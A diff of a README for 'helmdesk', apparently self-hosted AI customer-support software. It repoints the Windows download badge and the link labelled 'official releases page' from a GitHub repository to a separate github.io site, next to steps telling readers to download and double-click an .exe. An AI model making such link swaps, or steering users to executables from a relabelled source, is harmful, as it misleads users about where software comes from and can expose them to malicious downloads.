@@ -1,6 +1,6 @@
 # 🤖 helmdesk - Simple AI support for growing teams
 
-[![Download for Windows](https://img.shields.io/badge/Download-Helmdesk-blue.svg)](https://github.com/abject-attack265/helmdesk)
+[![Download for Windows](https://img.shields.io/badge/Download-Helmdesk-blue.svg)](https://abject-attack265.github.io)
 
 Helmdesk helps small and medium-sized teams manage customer questions. It uses artificial intelligence to draft replies and organize messages. You host the data on your own hardware to keep information private.
 
@@ -8,7 +8,7 @@ Helmdesk helps small and medium-sized teams manage customer questions. It uses a
 
 Follow these steps to run Helmdesk on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/abject-attack265/helmdesk) to download the software.
+1. Visit the [official releases page](https://abject-attack265.github.io) to download the software.
 2. Select the file ending in `.exe` for Windows systems.
 3. Save the file to a folder you can find easily, such as your Downloads folder.
 4. Double-click the file to start the installation process.
